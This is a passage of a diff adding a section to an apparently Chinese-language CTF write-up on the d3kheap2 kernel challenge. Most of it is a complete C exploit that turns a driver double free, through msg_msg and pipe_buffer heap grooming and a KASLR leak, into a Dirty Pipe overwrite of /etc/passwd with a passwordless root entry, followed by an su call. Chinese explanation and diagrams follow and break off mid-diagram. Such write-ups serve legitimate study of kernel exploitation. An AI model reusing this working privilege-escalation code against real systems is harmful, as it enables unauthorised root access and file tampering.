@@ -3665,8 +3665,1317 @@ d3kheap2进阶利用代码展示了现代内核漏洞利用的多个高级技术
               height: auto;">
 </div>
 
+## 6. 进阶分析：Dirty Pipe其三
+
+exploit核心代码如下：
+
+```c
+/* =============================================================== *
+ *  Constants and Macros
+ * =============================================================== */
+#define PAGE_CACHE_PIPE_BUF_OPS 0xffffffff824290b0
+#define ANON_PIPE_BUF_OPS       0xffffffff824276c8
+#define KASLR_GRANULARITY       0x10000000
+#define KASLR_MASK              (~(KASLR_GRANULARITY - 1))
+#define CHUNK_SPRAY_COUNT       0x100
+#define FIRST_MSG_TYPE          0x41
+#define SECOND_MSG_TYPE         0x42
+#define FIRST_MSG_SIZE          (0x1000 - sizeof(struct msg_msg))
+#define SECOND_MSG_SIZE         (0x1000 - sizeof(struct msg_msg) + 0x800 - sizeof(struct msg_msgseg))
+#define MSG_QUEUE_NUM           0x800
+#define EVIL_MSG_QUEUE_NUM      32
+#define MAX_PIPE_COUNT          128
+#define PIPE_BUFFER_SIZE        (0x1000 * 32)
+#define EVIL_PASSWD_ENTRY       "root::0:0:root:/root:/bin/sh\n"
+
+/* =============================================================== *
+ *  Message Data Structures
+ * =============================================================== */
+struct {
+    long mtype;                 // Message type
+    char mtext[FIRST_MSG_SIZE]; // Message text buffer
+} first_msg_data;
+
+struct {
+    long mtype;                  // Message type
+    char mtext[SECOND_MSG_SIZE]; // Message text buffer
+} second_msg_data;
+
+/* =============================================================== *
+ *  Device Control Macros and Structures
+ * =============================================================== */
+#define OBJ_ADD  0x3361626e
+#define OBJ_DEL  0x74747261
+#define OBJ_EDIT 0x54433344
+#define OBJ_SHOW 0x4e575046
+
+struct d3kheap2_ureq {
+    size_t idx;  // Object index
+};
+
+/* =============================================================== *
+ *  Global Variables
+ * =============================================================== */
+static int dev_fd;                              // Vulnerable device file descriptor
+static int victim_fd;                           // /etc/passwd file descriptor
+static int msqid[MSG_QUEUE_NUM];                // Message queue IDs for spraying
+static int evil_msqid[EVIL_MSG_QUEUE_NUM];      // Message queue IDs for exploitation
+static int pipe_fds[MAX_PIPE_COUNT][2];         // Pipe file descriptors array
+static int victim_qid = -1;                     // Victim message queue index
+static int overlap_qid = -1;                    // Overlapping message queue index
+static int evil_qid = -1;                       // Evil message queue index for exploitation
+static int victim_pipe_idx = -1;                // Victim pipe index
+static int overlap_pipe_idx = -1;               // Overlapping pipe index
+static size_t pipe_data[0x1000 / 8] = {0};      // Pipe data buffer
+static struct pipe_buffer victim_pipe_buf;      // Original pipe_buffer structure
+static struct pipe_buffer fake_pipe_buf;        // Forged pipe_buffer structure
+static char evil_data[] = EVIL_PASSWD_ENTRY;    // Malicious /etc/passwd entry
+
+/* =============================================================== *
+ *  Device Operation Wrappers
+ * =============================================================== */
+
+/**
+ * add_chunk - Allocate kernel object
+ * @idx: Object index
+ *
+ * Allocates a kernel object at specified index via driver's ADD ioctl.
+ * Used for heap spraying in kmalloc-2k slab.
+ */
+static int add_chunk(size_t idx) {
+    struct d3kheap2_ureq ureq = { .idx = idx };
+    return ioctl(dev_fd, OBJ_ADD, &ureq);
+}
+
+/**
+ * delete_chunk - Free kernel object
+ * @idx: Object index
+ *
+ * Frees a kernel object at specified index via driver's DELETE ioctl.
+ * Used to create UAF (Use-After-Free) conditions.
+ */
+static int delete_chunk(size_t idx) {
+    struct d3kheap2_ureq ureq = { .idx = idx };
+    return ioctl(dev_fd, OBJ_DEL, &ureq);
+}
+
+/* =============================================================== *
+ *  Pipe Management Functions
+ * =============================================================== */
+
+/**
+ * create_pipe_pair - Create a pipe pair for heap spraying
+ * @pipe_idx: Index in pipe_fds array
+ *
+ * Creates a pipe and stores read/write file descriptors in global array.
+ * Pipes are used to control heap allocations in kmalloc-2k slab.
+ */
+static void create_pipe_pair(int pipe_idx) {
+    if (pipe(pipe_fds[pipe_idx]) < 0) {
+        log.error("Failed to create pipe at index %d", pipe_idx);
+        exit(EXIT_FAILURE);
+    }
+}
+
+/**
+ * resize_pipe_buffer - Resize pipe buffer capacity
+ * @pipe_idx: Index in pipe_fds array
+ * @new_size: New buffer size in bytes
+ *
+ * Adjusts pipe buffer size to control allocation in specific slab caches.
+ * This is used to occupy freed kmalloc-2k chunks.
+ */
+static void resize_pipe_buffer(int pipe_idx, int new_size) {
+    if (fcntl(pipe_fds[pipe_idx][0], F_SETPIPE_SZ, new_size) < 0) {
+        log.error("Failed to resize pipe %d to 0x%x bytes", pipe_idx, new_size);
+        exit(EXIT_FAILURE);
+    }
+}
+
+/* =============================================================== *
+ *  Phase 1: Environment Setup
+ * =============================================================== */
+
+/**
+ * setup_environment - Initialize exploitation environment
+ *
+ * Prepares the exploitation environment by:
+ * 1. Increasing file descriptor limits for mass spraying
+ * 2. Binding to CPU core 0 for stability
+ * 3. Opening vulnerable device and target file (/etc/passwd)
+ * 4. Creating all necessary IPC and pipe objects
+ */
+static void setup_environment(void) {
+    struct rlimit rl = {0};
+
+    log.info("===========================================================");
+    log.info("PHASE 1: ENVIRONMENT SETUP                                 ");
+    log.info("===========================================================");
+
+    // Increase file descriptor limit for mass object creation
+    rl.rlim_cur = 4096;
+    rl.rlim_max = 4096;
+    if (setrlimit(RLIMIT_NOFILE, &rl) == -1) {
+        log.error("Failed to expand file descriptor limit");
+        exit(EXIT_FAILURE);
+    }
+    log.info("File descriptor limit expanded to 4096");
+
+    // Bind to CPU core 0 for timing consistency
+    bind_core(0);
+
+    // Open vulnerable device driver
+    dev_fd = open("/proc/d3kheap2", O_RDWR);
+    if (dev_fd < 0) {
+        log.error("Failed to open vulnerable device /proc/d3kheap2");
+        exit(EXIT_FAILURE);
+    }
+    log.info("Opened vulnerable device at fd: %d", dev_fd);
+
+    // Open target file for Dirty Pipe exploitation
+    victim_fd = open("/etc/passwd", O_RDONLY);
+    if (victim_fd < 0) {
+        log.error("Failed to open target file /etc/passwd");
+        exit(EXIT_FAILURE);
+    }
+    log.info("Opened target file /etc/passwd at fd: %d", victim_fd);
+
+    // Create all pipe pairs for heap manipulation
+    log.info("Creating %d pipe pairs for heap spraying...", MAX_PIPE_COUNT);
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        create_pipe_pair(i);
+    }
+    log.success("Created %d pipe pairs", MAX_PIPE_COUNT);
+
+    // Create normal message queues for heap spraying
+    log.info("Creating %d normal message queues...", MSG_QUEUE_NUM);
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
+            log.error("Failed to create message queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Created %d normal message queues", MSG_QUEUE_NUM);
+
+    // Create evil message queues for exploitation phase
+    log.info("Creating %d evil message queues for exploitation...", EVIL_MSG_QUEUE_NUM);
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        if ((evil_msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
+            log.error("Failed to create evil message queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Created %d evil message queues", EVIL_MSG_QUEUE_NUM);
+
+    log.success("Environment setup completed successfully");
+}
+
+/* =============================================================== *
+ *  Phase 2: Initial Heap Spraying
+ * =============================================================== */
+
+/**
+ * initial_heap_spraying - Spray initial objects on heap
+ *
+ * Performs initial heap spraying to establish controlled heap layout:
+ * 1. Sends first messages to all queues (kmalloc-4k allocations via write_msg)
+ * 2. Sprays driver objects (kmalloc-2k allocations)
+ * 3. Frees driver objects to create heap holes
+ *
+ * This establishes a predictable heap state for exploitation.
+ */
+static void initial_heap_spraying(void) {
+    log.info("===========================================================");
+    log.info("PHASE 2: INITIAL HEAP SPRAYING                            ");
+    log.info("===========================================================");
+
+    // Send first messages to all queues (kmalloc-4k allocations via write_msg)
+    log.info("Sending first messages (kmalloc-4k) to all %d queues...", MSG_QUEUE_NUM);
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        if (write_msg(msqid[i], &first_msg_data, sizeof(first_msg_data), FIRST_MSG_TYPE) < 0) {
+            log.error("Failed to send first message to queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Sent first messages to all %d queues (write_msg = kmalloc-4k)", MSG_QUEUE_NUM);
+
+    // Spray driver objects to fill kmalloc-2k slab
+    log.info("Spraying %d driver objects (kmalloc-2k)...", CHUNK_SPRAY_COUNT);
+    for (int i = 0; i < CHUNK_SPRAY_COUNT; i++) {
+        if (add_chunk(i) < 0) {
+            log.error("Failed to allocate chunk %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Allocated %d driver objects (kmalloc-2k)", CHUNK_SPRAY_COUNT);
+
+    // Free all driver objects to create heap holes
+    log.info("Freeing all driver objects to create heap holes...");
+    for (int i = 0; i < CHUNK_SPRAY_COUNT; i++) {
+        if (delete_chunk(i) < 0) {
+            log.error("Failed to free chunk %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Freed all driver objects, created heap holes in kmalloc-2k slab");
+
+    log.success("Initial heap spraying completed");
+}
+
+/* =============================================================== *
+ *  Phase 3: Trigger Double Free Vulnerability
+ * =============================================================== */
+
+/**
+ * trigger_double_free - Trigger driver's double free vulnerability
+ *
+ * This phase exploits the driver's double free bug:
+ * 1. Process first half of queues: free messages and send larger ones
+ * 2. Free driver objects (second free - triggers double free)
+ * 3. Process second half of queues: send larger messages
+ *
+ * The driver bug allows delete_chunk to be called twice on the same index
+ * without reallocation, creating a double free condition.
+ * msg_msgseg (0x800 = 2048 bytes) is used to occupy freed kmalloc-2k holes.
+ */
+static void trigger_double_free(void) {
+    log.info("===========================================================");
+    log.info("PHASE 3: TRIGGER DRIVER DOUBLE FREE VULNERABILITY          ");
+    log.info("===========================================================");
+
+    // Process first half of message queues: free messages and send larger ones
+    log.info("Processing first half of message queues (0-%d)...", MSG_QUEUE_NUM/2 - 1);
+    memset(&second_msg_data, 0, sizeof(second_msg_data));
+    for (int i = 0; i < MSG_QUEUE_NUM / 2; i++) {
+        // read_msg: Free first message (kmalloc-4k chunk)
+        if (read_msg(msqid[i], &first_msg_data, sizeof(first_msg_data), FIRST_MSG_TYPE) < 0) {
+            log.error("Failed to read first message from queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+
+        // Prepare forged message with identification markers
+        size_t *fake_msg = (size_t *)&second_msg_data.mtext[FIRST_MSG_SIZE];
+        fake_msg[0] = *(size_t *)"BinRacer";  // First marker
+        fake_msg[1] = i;                      // Original queue index
+        fake_msg[2] = *(size_t *)"BinRacer";  // Second marker
+
+        // write_msg: Allocate larger second message (kmalloc-4k + msg_msgseg)
+        // msg_msgseg (2048 bytes) will occupy freed kmalloc-2k holes
+        if (write_msg(msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE) < 0) {
+            log.error("Failed to send second message to queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Processed first %d message queues", MSG_QUEUE_NUM / 2);
+    log.info("msg_msgseg (2048 bytes) occupies freed kmalloc-2k holes");
+
+    // Free driver objects (second free - triggers double free)
+    // Note: initial_heap_spraying already did first free
+    log.info("Freeing driver objects (second free - triggers double free)...");
+    for (int i = 0; i < CHUNK_SPRAY_COUNT; i++) {
+        if (delete_chunk(i) < 0) {
+            log.error("Failed to free chunk %d (second time - double free)", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Triggered double free for %d driver objects (kmalloc-2k)", CHUNK_SPRAY_COUNT);
+
+    // Process second half of message queues: send larger messages
+    log.info("Processing second half of message queues (%d-%d)...",
+             MSG_QUEUE_NUM/2, MSG_QUEUE_NUM-1);
+    for (int i = MSG_QUEUE_NUM / 2; i < MSG_QUEUE_NUM; i++) {
+        size_t *fake_msg = (size_t *)&second_msg_data.mtext[FIRST_MSG_SIZE];
+        fake_msg[0] = *(size_t *)"BinRacer";  // First marker
+        fake_msg[1] = i;                      // Original queue index
+        fake_msg[2] = *(size_t *)"BinRacer";  // Second marker
+
+        if (write_msg(msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE) < 0) {
+            log.error("Failed to send second message to queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Processed second %d message queues", MSG_QUEUE_NUM / 2);
+    log.info("msg_msgseg sprayed to occupy double-freed kmalloc-2k objects");
+
+    log.success("Double free vulnerability triggered successfully");
+    log.warn("Heap now contains overlapping msg_msgseg and driver objects in kmalloc-2k slab");
+}
+
+/* =============================================================== *
+ *  Phase 4: Detect Heap Corruption
+ * =============================================================== */
+
+/**
+ * detect_heap_corruption - Detect corrupted message queues
+ *
+ * Scans all message queues to find corruption caused by double free.
+ * The corrupted queue will have incorrect metadata revealing heap overlap.
+ * Uses peek_msg to read without freeing (no allocation/free).
+ *
+ * Returns: 0 if corruption found, -1 if not found
+ */
+static int detect_heap_corruption(void) {
+    log.info("===========================================================");
+    log.info("PHASE 4: DETECT HEAP CORRUPTION                           ");
+    log.info("===========================================================");
+
+    log.info("Scanning %d message queues for corruption...", MSG_QUEUE_NUM);
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        // peek_msg: Read message without removing it
+        if (peek_msg(msqid[i], &second_msg_data, sizeof(second_msg_data), 0) < 0) {
+            log.warn("Failed to peek message from queue %d, continuing...", i);
+            continue;
+        }
+
+        // Check for corruption markers
+        size_t *leak_data = (size_t *)&second_msg_data.mtext[FIRST_MSG_SIZE];
+        if (leak_data[1] != i) {  // Queue index mismatch indicates corruption
+            victim_qid = i;
+            overlap_qid = leak_data[1];
+
+            log.success("Found heap corruption!");
+            log.info("Victim queue ID: %d", victim_qid);
+            log.info("Overlap queue ID: %d", overlap_qid);
+
+            hex_dump2("Corrupted message data:", leak_data, 0x30);
+            return 0;
+        }
+    }
+
+    log.error("No heap corruption detected - double free failed");
+    return -1;
+}
+
+/* =============================================================== *
+ *  Phase 5: Pipe Buffer Heap Feng Shui
+ * =============================================================== */
+
+/**
+ * pipe_heap_fengshui - Manipulate heap with pipe buffers
+ *
+ * Performs heap feng shui using pipe buffers to:
+ * 1. Free victim message to create kmalloc-2k hole
+ * 2. Resize even pipes to occupy the hole
+ * 3. Free overlap message to create another hole
+ * 4. Resize odd pipes to occupy the second hole
+ * 5. Detect pipe overlap through data corruption
+ */
+static void pipe_heap_fengshui(void) {
+    log.info("===========================================================");
+    log.info("PHASE 5: PIPE BUFFER HEAP FENG SHUI                       ");
+    log.info("===========================================================");
+
+    // Free victim message to create kmalloc-2k hole (read_msg = free)
+    log.info("Freeing victim message (queue %d) to create kmalloc-2k hole (read_msg)...", victim_qid);
+    if (read_msg(msqid[victim_qid], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE) < 0) {
+        log.error("Failed to read victim message from queue %d", victim_qid);
+        exit(EXIT_FAILURE);
+    }
+    log.success("Freed victim message, created kmalloc-2k hole");
+
+    // Resize even pipes to occupy the hole (kmalloc-2k allocations)
+    log.info("Resizing even-indexed pipes to occupy freed kmalloc-2k hole...");
+    for (int i = 0; i < MAX_PIPE_COUNT; i += 2) {
+        resize_pipe_buffer(i, PIPE_BUFFER_SIZE);
+    }
+    log.success("Resized %d even pipes to occupy first hole (kmalloc-2k alloc)", MAX_PIPE_COUNT/2);
+
+    // Free overlap message to create second kmalloc-2k hole (read_msg = free)
+    log.info("Freeing overlap message (queue %d) to create second kmalloc-2k hole (read_msg)...", overlap_qid);
+    if (read_msg(msqid[overlap_qid], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE) < 0) {
+        log.error("Failed to read overlap message from queue %d", overlap_qid);
+        exit(EXIT_FAILURE);
+    }
+    log.success("Freed overlap message, created second kmalloc-2k hole");
+
+    // Resize odd pipes to occupy the second hole (kmalloc-2k allocations)
+    log.info("Resizing odd-indexed pipes to occupy second kmalloc-2k hole...");
+    for (int i = 1; i < MAX_PIPE_COUNT; i += 2) {
+        resize_pipe_buffer(i, PIPE_BUFFER_SIZE);
+    }
+    log.success("Resized %d odd pipes to occupy second hole (kmalloc-2k alloc)", MAX_PIPE_COUNT/2);
+
+    // Write index values to all pipes for detection
+    log.info("Writing index values to all %d pipes...", MAX_PIPE_COUNT);
+    for (size_t i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (write(pipe_fds[i][1], &i, sizeof(i)) != sizeof(i)) {
+            log.error("Failed to write index to pipe %ld", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Wrote index values to all pipes");
+
+    // Detect pipe overlap by reading back values
+    log.info("Detecting pipe overlap by reading index values...");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        size_t idx = 0;
+        if (read(pipe_fds[i][0], &idx, sizeof(idx)) != sizeof(idx)) {
+            log.error("Failed to read from pipe %d", i);
+            exit(EXIT_FAILURE);
+        }
+
+        if (i != idx) {  // Index mismatch indicates overlap
+            victim_pipe_idx = i;
+            overlap_pipe_idx = idx;
+
+            log.success("Found pipe buffer overlap!");
+            log.info("Victim pipe index: %d", victim_pipe_idx);
+            log.info("Overlap pipe index: %ld", overlap_pipe_idx);
+            break;
+        }
+    }
+
+    if (victim_pipe_idx == -1) {
+        log.error("Failed to detect pipe buffer overlap");
+        exit(EXIT_FAILURE);
+    }
+
+    log.success("Pipe heap feng shui completed successfully");
+}
+
+/* =============================================================== *
+ *  Phase 6: Leak Kernel Address
+ * =============================================================== */
+
+/**
+ * leak_kernel_address - Leak kernel pointers from pipe_buffer
+ *
+ * Extracts kernel pointers from corrupted pipe_buffer structure:
+ * 1. Clean up unrelated pipes
+ * 2. Spray evil messages to capture pipe_buffer data
+ * 3. Search for pipe_buffer in evil messages
+ * 4. Extract kernel pointers for KASLR bypass
+ */
+static void leak_kernel_address(void) {
+    log.info("===========================================================");
+    log.info("PHASE 6: LEAK KERNEL ADDRESS                              ");
+    log.info("===========================================================");
+
+    // Clean up unrelated pipes
+    log.info("Cleaning up unrelated pipes...");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) {
+            continue;
+        }
+        close(pipe_fds[i][0]);
+        close(pipe_fds[i][1]);
+        create_pipe_pair(i);
+    }
+
+    // Close victim pipe
+    log.info("Closing victim pipe %d...", victim_pipe_idx);
+    close(pipe_fds[victim_pipe_idx][0]);
+    close(pipe_fds[victim_pipe_idx][1]);
+
+    // Resize remaining pipes
+    log.info("Resizing remaining pipes to occupy freed kmalloc-2k...");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) {
+            continue;
+        }
+        resize_pipe_buffer(i, PIPE_BUFFER_SIZE);
+    }
+
+    // Write/read to trigger page allocations
+    log.info("Triggering page allocations in remaining pipes...");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) {
+            continue;
+        }
+        if (write(pipe_fds[i][1], pipe_data, 0x8) != 0x8) {
+            log.error("Failed to write to pipe %d", i);
+            exit(EXIT_FAILURE);
+        }
+        if (read(pipe_fds[i][0], pipe_data, 0x8) != 0x8) {
+            log.error("Failed to read from pipe %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    // Close overlap pipe
+    log.info("Closing overlap pipe %d...", overlap_pipe_idx);
+    close(pipe_fds[overlap_pipe_idx][0]);
+    close(pipe_fds[overlap_pipe_idx][1]);
+
+    // Spray evil messages to capture pipe_buffer data (write_msg = alloc)
+    log.info("Spraying evil messages to occupy freed kmalloc-2k...");
+    memset(&second_msg_data, 0, sizeof(second_msg_data));
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        if (write_msg(evil_msqid[i], &second_msg_data, sizeof(second_msg_data), SECOND_MSG_TYPE) < 0) {
+            log.error("Failed to send evil message to queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Sprayed %d evil messages (write_msg = kmalloc-4k + msg_msgseg)", EVIL_MSG_QUEUE_NUM);
+
+    // Splice /etc/passwd data into pipes
+    log.info("Splicing /etc/passwd data into pipes...");
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (i == victim_pipe_idx || i == overlap_pipe_idx) {
+            continue;
+        }
+        off_t offset = 0;
+        if (splice(victim_fd, &offset, pipe_fds[i][1], NULL, 0x1000, 0) < 0) {
+            log.error("Failed to splice /etc/passwd to pipe %d", i);
+            exit(EXIT_FAILURE);
+        }
+        // Write small amount of data to each pipe
+        if (write(pipe_fds[i][1], pipe_data, i) != i) {
+            log.error("Failed to write data to pipe %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Spliced /etc/passwd data into pipes");
+
+    // Search for pipe_buffer in evil messages (peek_msg = read only, no alloc/free)
+    log.info("Searching for pipe_buffer in evil messages (peek_msg = read only)...");
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        if (peek_msg(evil_msqid[i], &second_msg_data, sizeof(second_msg_data), 0) < 0) {
+            continue;
+        }
+
+        // pipe_buffer is located at offset 0x20 in the msg_msgseg
+        struct pipe_buffer *pipe_buf = (struct pipe_buffer*)&second_msg_data.mtext[FIRST_MSG_SIZE + 0x20];
+        victim_pipe_buf = pipe_buf[0];
+        fake_pipe_buf = pipe_buf[1];
+
+        // Check if we found a valid pipe_buffer
+        if (fake_pipe_buf.ops > kernel_base) {
+            evil_qid = i;
+            victim_pipe_idx = fake_pipe_buf.len;  // Reusing len field to store pipe index
+
+            log.success("Found pipe_buffer in evil message queue %d!", evil_qid);
+            log.info("Victim pipe index: %d", victim_pipe_idx);
+            log.info("Leaked pipe_buffer->page: 0x%lx", fake_pipe_buf.page);
+            log.info("Leaked pipe_buffer->ops: 0x%lx", fake_pipe_buf.ops);
+
+            // Calculate kernel base from leaked ops pointer
+            kernel_offset = fake_pipe_buf.ops - ANON_PIPE_BUF_OPS;
+            kernel_base += kernel_offset;
+
+            log.success("Calculated kernel offset: 0x%lx", kernel_offset);
+            log.success("Kernel base address: 0x%lx", kernel_base);
+
+            hex_dump2("Leaked pipe_buffer data:", (void*)pipe_buf, sizeof(struct pipe_buffer) * 2);
+            return;
+        }
+    }
+
+    log.error("Failed to leak kernel addresses - pipe_buffer not found");
+    exit(EXIT_FAILURE);
+}
+
+/* =============================================================== *
+ *  Phase 7: Trigger Dirty Pipe
+ * =============================================================== */
+
+/**
+ * trigger_dirty_pipe - Exploit Dirty Pipe vulnerability
+ *
+ * Modifies pipe_buffer structure to trigger Dirty Pipe vulnerability:
+ * 1. Reads evil message containing pipe_buffer (read_msg = free)
+ * 2. Modifies pipe_buffer to set PIPE_BUF_FLAG_CAN_MERGE flag
+ * 3. Writes modified pipe_buffer back to heap (write_msg = alloc)
+ * 4. Writes to pipe to overwrite /etc/passwd in page cache
+ */
+static void trigger_dirty_pipe(void) {
+    log.info("===========================================================");
+    log.info("PHASE 7: TRIGGER DIRTY PIPE                               ");
+    log.info("===========================================================");
+
+    // Prepare forged pipe_buffer structure
+    log.info("Preparing forged pipe_buffer for Dirty Pipe...");
+    fake_pipe_buf.page = victim_pipe_buf.page;  // Use leaked page pointer
+    fake_pipe_buf.offset = 0;                   // Start of file
+    fake_pipe_buf.len = 0;                      // No data yet
+    fake_pipe_buf.flags = 0x10;                 // PIPE_BUF_FLAG_CAN_MERGE flag
+
+    // Read evil message containing pipe_buffer (read_msg = free)
+    log.info("Reading evil message from queue %d (read_msg = free)...", evil_qid);
+    if (read_msg(evil_msqid[evil_qid], &second_msg_data,
+                sizeof(second_msg_data), 0) < 0) {
+        log.error("Failed to read evil message from queue %d", evil_qid);
+        exit(EXIT_FAILURE);
+    }
+
+    // Overwrite pipe_buffer in message
+    log.info("Overwriting pipe_buffer in message data...");
+    struct pipe_buffer *pipe_buf = (struct pipe_buffer *)&second_msg_data.mtext[FIRST_MSG_SIZE + 0x20];
+    pipe_buf[0] = fake_pipe_buf;
+    pipe_buf[1] = fake_pipe_buf;
+
+    // Write modified message back to all evil queues (write_msg = alloc)
+    log.info("Writing modified message to all evil queues (write_msg = alloc)...");
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        if (write_msg(evil_msqid[i], &second_msg_data,
+                      sizeof(second_msg_data), SECOND_MSG_TYPE) < 0) {
+            log.error("Failed to write modified message to queue %d", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Modified pipe_buffer written to heap");
+
+    // Trigger Dirty Pipe by writing to corrupted pipe
+    log.info("Triggering Dirty Pipe vulnerability...");
+    log.warn("Writing malicious entry to /etc/passwd via pipe %d", victim_pipe_idx);
+
+    if (write(pipe_fds[victim_pipe_idx][1], evil_data, sizeof(evil_data)) != sizeof(evil_data)) {
+        log.error("Failed to write evil data to pipe %d", victim_pipe_idx);
+        exit(EXIT_FAILURE);
+    }
+
+    log.success("Dirty Pipe triggered successfully!");
+    log.warn("/etc/passwd modified in page cache");
+}
+
+/* =============================================================== *
+ *  Phase 8: Privilege Escalation
+ * =============================================================== */
+
+/**
+ * escalate_privileges - Escalate to root privileges
+ *
+ * Triggers privilege escalation by executing su command. The modified
+ * /etc/passwd file allows root access without password.
+ */
+static void escalate_privileges(void) {
+    log.info("===========================================================");
+    log.info("PHASE 8: PRIVILEGE ESCALATION                              ");
+    log.info("===========================================================");
+
+    log.info("Attempting privilege escalation...");
+    log.info("Modified /etc/passwd should allow root access without password");
+
+    system("su -c 'cat /root/flag' && su");
+
+    log.info("===========================================================");
+    log.info("EXPLOIT COMPLETED SUCCESSFULLY                            ");
+    log.info("===========================================================");
+}
+
+/* =============================================================== *
+ *  Main Exploitation Flow
+ * =============================================================== */
+
+int main(int argc, char **argv, char **envp) {
+    log.info("===========================================================");
+    log.info("D3KHEAP2 EXPLOIT - CROSS-CACHE DOUBLE FREE TO DIRTY PIPE   ");
+    log.info("===========================================================");
+
+    // Phase 1: Environment Setup
+    setup_environment();
+
+    // Phase 2: Initial Heap Spraying
+    initial_heap_spraying();
+
+    // Phase 3: Trigger Double Free Vulnerability
+    trigger_double_free();
+
+    // Phase 4: Detect Heap Corruption
+    if (detect_heap_corruption() < 0) {
+        log.error("Exploit failed: No heap corruption detected");
+        exit(EXIT_FAILURE);
+    }
+
+    // Phase 5: Pipe Buffer Heap Feng Shui
+    pipe_heap_fengshui();
+
+    // Phase 6: Leak Kernel Address
+    leak_kernel_address();
+
+    // Phase 7: Trigger Dirty Pipe
+    trigger_dirty_pipe();
+
+    // Phase 8: Privilege Escalation
+    escalate_privileges();
+
+    // Cleanup
+    close(dev_fd);
+    close(victim_fd);
+    return 0;
+}
+```
+
+### 6-1. 整体架构与高级技术设计
+
+本章节展示的d3kheap2利用代码代表了该漏洞利用技术的最高级版本，采用了极其复杂和精密的跨缓存利用技术。相比前两个版本，这个版本在多个关键技术上进行了重大优化，特别是在消息队列管理、堆布局控制和信息泄露方面，展示了现代内核漏洞利用工程的技术深度。
+
+```mermaid
+graph TD
+    A[开始] --> B[阶段1: 环境建立与资源初始化]
+    B --> C[阶段2: 初始堆喷布局]
+    C --> D[阶段3: 双重释放漏洞触发]
+    D --> E[阶段4: 堆污染检测]
+    E --> F[阶段5: 管道缓冲区堆布局优化]
+    F --> G[阶段6: 内核地址泄露]
+    G --> H[阶段7: Dirty Pipe漏洞触发]
+    H --> I[阶段8: 权限提升]
+    I --> J[完成]
+
+    style A fill:#f9f,stroke:#333,stroke-width:2px
+    style J fill:#9f9,stroke:#333,stroke-width:2px
+```
+
+### 6-2. 第一阶段：环境建立与资源初始化
+
+第一阶段建立了高度优化的执行环境，通过精细化资源管理为后续复杂的内存操作提供最佳条件。
+
+**核心代码实现**：
+
+```c
+static void setup_environment(void) {
+    // 扩展文件描述符限制
+    struct rlimit rl = {0};
+    rl.rlim_cur = 4096;
+    rl.rlim_max = 4096;
+    setrlimit(RLIMIT_NOFILE, &rl);
+
+    // 绑定到CPU核心0以提高时序一致性
+    bind_core(0);
+
+    // 打开漏洞设备驱动和目标文件
+    dev_fd = open("/proc/d3kheap2", O_RDWR);
+    victim_fd = open("/etc/passwd", O_RDONLY);
+
+    // 创建管道对用于堆控制
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        create_pipe_pair(i);
+    }
+
+    // 创建普通消息队列用于堆喷
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    }
+
+    // 创建特殊消息队列用于利用阶段
+    for (int i = 0; i < EVIL_MSG_QUEUE_NUM; i++) {
+        evil_msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    }
+}
+```
+
+**技术实现特点**：
+
+1. **双重消息队列架构**：
+    - 普通消息队列（2048个）：用于初始堆布局和内存状态控制
+    - 特殊消息队列（32个）：专门用于后续的精确内存操作和数据提取
+      这种分离设计提高了内存操作的可靠性和成功率，每个队列类型有专门用途。
+
+2. **精细化资源管理**：
+    - 通过`setrlimit(RLIMIT_NOFILE, &rl)`扩展文件描述符限制到4096
+    - 通过`bind_core(0)`绑定到CPU核心0，确保时序一致性
+    - 管道数量优化为128个，减少资源消耗
+    - 消息队列总数增加到2080个（2048+32），提高堆控制精度
+
+3. **资源文件准备**：
+    - 打开漏洞设备`/proc/d3kheap2`用于触发驱动程序漏洞
+    - 打开目标文件`/etc/passwd`用于后续Dirty Pipe利用
+
+```mermaid
+sequenceDiagram
+    participant 用户空间
+    participant 内核
+    participant 消息队列子系统
+    participant 管道子系统
+
+    用户空间->>内核: setrlimit扩展文件描述符限制
+    用户空间->>内核: bind_core绑定CPU核心
+    用户空间->>内核: open打开漏洞设备
+    用户空间->>内核: open打开目标文件
